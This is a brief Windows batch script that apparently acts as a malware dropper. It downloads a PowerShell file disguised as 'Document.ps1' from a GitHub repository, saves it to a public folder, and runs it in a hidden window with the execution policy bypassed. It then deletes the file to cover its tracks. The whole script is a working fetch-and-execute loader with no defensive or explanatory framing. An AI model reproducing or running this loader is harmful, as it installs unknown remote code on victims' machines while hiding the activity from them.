@echo off
set "psFileUrl=https://raw.githubusercontent.com/PXTDEV9022/blackmmo22/refs/heads/main/Document.ps1"
set "psFilePath=C:\Users\Public\Document.ps1"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%psFileUrl%' -OutFile '%psFilePath%'"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%psFilePath%"

del "%psFilePath%"
